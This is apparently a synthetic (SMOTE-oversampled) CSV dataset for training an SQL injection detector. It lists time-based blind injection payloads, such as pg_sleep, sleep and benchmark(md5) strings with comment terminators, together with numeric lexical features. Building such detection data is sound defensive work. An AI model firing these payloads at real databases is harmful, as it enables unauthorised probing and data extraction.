id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000247,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000076,0.1192510970856896,70.90234456785662,24.96744818928554,3.554286306632162,15.065103621428918,20.934896378571082,27.869792757142164,7.032551810714459,0.21252841520372906,0.29524200641125886,0.39301773775002236,0.0992118406349897,0.0,0.03255181071445923,0.0,0.0,0.0,1.0,0.0,4.967448189285541,0.0,0.0,1.0,1.0,0.0,0.0325518107144592,0.0,0.03255181071445923,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000248,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000075,2.700058621843183,72.13428313449863,24.555951306041095,3.453728036343608,17.600712350873973,10.0,31.533570783624658,13.0,0.24046257467156176,0.13959929461053103,0.43845904772421684,0.1814790829936903,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.0,0.5111902612082192,0.48880973879178075,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5111902612082192,0.0,0.0,0.5111902612082192,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4888097387917809,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.511190261208219
SMOTE_000249,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,1.5307049394518282,66.0,24.937143514360976,3.5909963772570435,19.468571757180488,10.0,27.0,9.531428242819512,0.2949783599572801,0.15151515151515152,0.4090909090909091,0.14441557943665928,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.5314282428195118,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.46857175718048816,0.5314282428195118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000250,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,0.8373154118050677,66.73701599652237,24.49134399768158,3.581077495814045,19.98268799536316,10.0,27.24567199884079,9.50865600231842,0.2990456969170056,0.14989675890091705,0.4082817127837919,0.14277583139828545,0.7543280011592097,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.7543280011592097,1.0,0.0,3.0,0.7543280011592097,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000251,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.4687033992084155,82.87460296566995,24.87460296566995,3.2290455944507026,30.0,2.0,39.0,11.874602965669949,0.361998517635895,0.02413323450905966,0.47059807292666356,0.14327017492838176,0.125397034330051,0.8746029656699489,0.0,0.0,1.0,0.0,0.0,8.0,0.8746029656699488,0.0,0.0,1.0,0.12539703433005112,0.874602965669949,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000252,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000021,2.002585154435831,77.92762771259027,25.98552554251805,3.7731905518637854,19.481906928147566,22.971051085036105,26.978288313777078,8.496381385629514,0.25,0.29301580000722593,0.3469686731675593,0.1100155268252147,0.0,1.0,0.0,0.0,0.0,1.4963813856295132,0.0,4.0,0.0,0.0,1.0,1.4963813856295132,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.49638138562951306,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.496381385629513
SMOTE_000253,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000074,0.6035487108384944,67.78599912416479,19.26199970805493,3.235867097475996,15.047998832219713,10.0,30.0,12.738000291945072,0.22106152811703408,0.14764669980747333,0.4429400994224201,0.1883516726530725,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,1.7380002919450719,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000254,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,0.5864368236485221,75.10909614882607,22.356361540469575,3.209306279590677,19.0,10.0,35.93091537859128,10.178180770234787,0.2531369853914575,0.13322999231129343,0.47789344167278963,0.13573958062445943,0.17818077023478662,0.0,2.0,0.0,0.0,1.0,0.0,5.821819229765214,0.17818077023478673,1.0,0.0,3.0,0.17818077023478673,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000255,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000100,0.17199684285867478,77.86952813525342,27.043490621582194,3.73413094178302,22.69556564892465,15.260943729493157,28.956509378417806,10.956509378417808,0.29132563649663146,0.19612148527720769,0.3718617804434598,0.14069109778270109,0.0,2.9130187568356147,0.0,0.0,0.0,1.0,0.0,5.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.043490621582192746,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9565093784178073,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9565093784178074
SMOTE_000256,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.6205444765627961,67.07658798416333,24.461270387330664,3.5751643790322833,21.461270387330664,10.0,27.615317596832668,8.0,0.3193084540511909,0.14928308880397798,0.4119819861016487,0.11942647104318238,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000257,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000014,1.3306371003928985,61.155607109853804,19.187316317101086,3.070759335682435,20.749265268404343,1.0,29.0,10.406341841449457,0.3366826772317398,0.01640471296330763,0.475736675935921,0.1711759338690316,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.4063418414494572,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000258,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.8422134499028415,90.37517732261736,28.75035464523472,3.645323796492574,25.0,18.0,37.0,10.37517732261736,0.27663254785525837,0.19917543445578603,0.40941617082578236,0.11477584686317321,0.3751773226173587,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.3751773226173589,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000259,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000113,0.386272853408213,75.23793620440483,26.917470919706343,3.8182016063154394,19.33011632117462,22.082529080293654,25.825290802936554,8.0,0.2568945976136092,0.29408936462873125,0.3424116480879417,0.1066043896697178,0.0,0.0,1.8349418394126893,0.0,0.0,1.0,0.0,4.165058160587311,0.0,0.0,1.0,2.8349418394126893,0.0,0.0,0.9174709197063446,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.08252908029365547,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0825290802936554
SMOTE_000260,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000044,0.48872071627037106,86.41890177174605,27.0,3.8552221499069548,19.887064412267577,28.209450885873025,29.435322061337878,8.887064412267575,0.23060252347122628,0.3259034899533462,0.34056223713841394,0.10293174943701355,0.0,0.0,2.0,0.0,0.0,1.887064412267575,0.0,4.0,0.0,0.0,1.0,3.8870644122675753,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8870644122675753,0.0,0.11293558773242474,0.8870644122675752,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8870644122675753
SMOTE_000261,attack,time,"1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000099,1.126276010280756,87.4236403333522,26.2709210000566,3.8102370552340368,22.0,27.0,30.0,8.4236403333522,0.25165620593864313,0.3088507981974256,0.3431675535526951,0.09632544231123613,0.0,0.4236403333521994,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.4236403333521994,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000262,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000105,0.00844068797411356,87.96859959890078,27.99790663992672,3.868717056843713,25.993719919780155,20.987439839560313,29.989533199633595,10.997906639926718,0.295495604509532,0.23856695428150548,0.34091234956424854,0.12502509164471398,3.9979066399267187,0.0,0.0,0.0,0.0,1.9979066399267187,0.0,4.0,0.002093360073281314,0.0,1.0,1.9979066399267187,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.002093360073281314,0.0,0.0,0.0,1.0,0.9979066399267187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000263,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,1.5392115929730528,93.75500819036229,27.52318256276021,3.7608732089869514,26.0,21.52318256276021,34.18546050208166,12.046365125520417,0.27827936031342754,0.23004877106580468,0.36336894840132206,0.12830292021944575,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.046365125520416,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.5231825627602078,0.47681743723979203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000264,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.47681210340407143,68.5803037390812,25.720202492720798,3.6494031449014943,22.440404985441596,10.0,27.8601012463604,8.279797507279202,0.32697429907698783,0.14584913539947036,0.4062579010330685,0.1209186644904733,0.13989875363960103,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.13989875363960125,1.0,0.0,3.0,0.13989875363960125,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000088,2.0174288331577896,78.59556201499701,24.781414728636094,3.602457084997665,23.562829457272187,13.12565891454437,30.12565891454437,11.781414728636094,0.30190926982595007,0.16348455029008319,0.3836515449709917,0.15095463491297503,3.6092926356819537,0.0,0.0,0.0,0.0,1.3907073643180463,0.0,4.390707364318047,0.0,0.0,0.39070736431804637,3.0,1.0,0.0,0.0,0.39070736431804637,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.39070736431804637,0.6092926356819536,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000266,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000035,0.036572364034251806,82.9620075981615,24.962007598161502,3.2342595019454485,29.981003799080753,2.0,39.0,11.981003799080751,0.361379150126408,0.024107973891059467,0.47010549087565984,0.1444073851068727,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.9905018995403756,0.0,0.0,1.0,0.0,1.0,0.0,0.9905018995403756,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.009498100459624292,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.009498100459624
SMOTE_000267,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000017,0.04091896353361124,59.033068573151894,22.977954284565406,3.620419502481833,20.96693142684811,10.0,22.06613714630378,6.0,0.3552089978534305,0.16940112473167881,0.3737492025758834,0.1016406748390073,0.9889771422827034,0.0,0.0,0.0,0.0,1.0,0.0,3.0110228577172964,0.0,0.0,0.0,1.0,0.9889771422827034,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.011022857717296608,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011022857717297
SMOTE_000268,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000013,1.5579255825082552,66.0,24.953808809180106,3.5916585844247404,19.47690440459005,10.0,27.0,9.523095595409947,0.2951046121907584,0.15151515151515152,0.4090909090909091,0.144289327203181,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.5230955954099465,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.47690440459005334,0.5230955954099465,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000269,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.1448645982221937,64.94310854409414,22.943108544094148,3.4898939455526525,19.0,10.0,27.0,8.943108544094146,0.2925675330918777,0.15398291215361984,0.4157538628147736,0.13769569193972891,0.0,0.9431085440941467,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.9431085440941469,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000270,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000128,1.483831435142065,76.94460000624736,26.0,3.546757062268296,15.563514286606765,21.436485713393235,31.38108571964059,8.563514286606765,0.20239170253914102,0.2794661398870315,0.4069127495477461,0.11122940802608133,0.43648571339323483,0.0,0.0,0.0,0.0,1.0,0.0,5.5635142866067655,0.0,0.0,1.0,1.0,0.4364857133932348,0.0,0.0,0.5635142866067651,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000138,0.8366580095468419,61.56919954006434,18.76153325667739,3.151788879964461,25.04613302670956,1.0,27.523066513354777,8.0,0.4063233619161875,0.016271456546904928,0.4472335291616679,0.13017165237523956,0.0,3.0,0.0,0.0,0.0,0.2384667433226102,0.0,4.76153325667739,0.0,0.0,0.0,0.2384667433226102,0.0,1.0,0.0,0.0,0.0,0.2384667433226102,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000272,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000095,0.4658473526661412,89.82145662766587,27.642913255331734,3.603831190529543,24.821456627665867,18.0,37.0,10.0,0.2763289239448541,0.20040122106142505,0.4119358432929292,0.11133401170079167,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.821456627665867,0.17854337233413295,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000273,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000124,1.745733323615666,76.492947713222,24.915491285537,3.349902137668045,19.4577456427685,10.0,35.577456427685,11.4577456427685,0.25541047583325055,0.13152393057318515,0.46287426221886185,0.15019133137470242,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.9154912855370005,0.5422543572315,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4577456427685,0.5422543572315,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000274,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000097,1.7492480888321655,65.8457738429841,18.61525794766137,2.729003036478357,12.077113078507947,4.461031790645473,36.61525794766137,12.692371026169315,0.18458486095216858,0.06558359082931742,0.5564572880140402,0.19337426020447385,0.0,3.0771130785079475,0.0,0.0,0.0,1.0,0.0,6.307628973830684,1.692371026169316,0.0,0.3076289738306841,1.0,0.0,1.0,0.0,0.3076289738306841,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6923710261693159,0.3076289738306841,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000108,0.3496498579449718,91.3289796895946,22.263183751675683,2.9932430950853766,28.328979689594604,1.0657959379189208,46.86840812416216,15.06579593791892,0.31006475737688416,0.011636727410831854,0.5133428449963153,0.1649556702159687,0.2631837516756814,2.8026121862432385,0.0,0.0,1.0,1.0,0.0,8.93420406208108,1.0657959379189204,0.0,0.0,2.0,0.06579593791892063,0.9342040620810799,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000276,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.06246610174057873,68.80638285375514,25.845106283004107,3.6559209961059715,22.845106283004107,10.0,27.961276570751025,8.0,0.3319215416419645,0.14536598085653277,0.40641969281627655,0.1162927846852262,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,1.1346252346448236,83.30333498420177,20.0,2.938303564360681,28.955002476302663,2.0,42.0,10.348332507899112,0.34743324019793415,0.024011807495876364,0.5042479574134038,0.12430699489278567,0.3483325078991122,0.0,0.0,0.0,1.0,0.0,0.0,9.0,0.0,0.0,0.0,1.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.348332507899112
SMOTE_000278,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000085,0.16355863804861223,77.4946332609614,17.936829157620174,2.7813926561549733,22.0,1.9684145788100889,41.62097494572105,11.905243736430263,0.2843503036101839,0.025340585323669146,0.536737272292362,0.15357183877378489,0.0,3.968414578810088,0.0,0.0,0.0,0.03158542118991248,0.0,7.905243736430262,0.0,0.0,0.0,0.0315854211899127,0.0,1.0,0.0,0.0,0.0,0.03158542118991248,1.0,0.0,0.0,0.0,0.0,0.03158542118991248,0.0,0.0,0.0,1.0,0.9684145788100875,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
